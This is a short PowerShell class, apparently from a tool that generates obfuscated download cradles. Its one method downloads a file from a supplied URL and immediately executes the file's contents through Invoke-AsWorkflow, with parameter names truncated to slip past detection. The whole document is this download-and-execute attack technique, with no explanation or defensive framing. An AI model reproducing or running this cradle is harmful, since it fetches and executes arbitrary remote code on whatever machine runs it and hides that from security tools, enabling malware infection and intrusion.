Class ObfDownloadFile15 {

    static Execute ([String]$url, [String]$path) {
        #CLI:  Disk\PsWebFile\Invoke\10
        (New-Object Net.WebClient).DownloadFile($url,$path);Invoke-AsWorkflow -Expressi ((-Join([Text.Encoding]::ASCII.GetString((TYPE -Encod 3 $path)))))
    }

}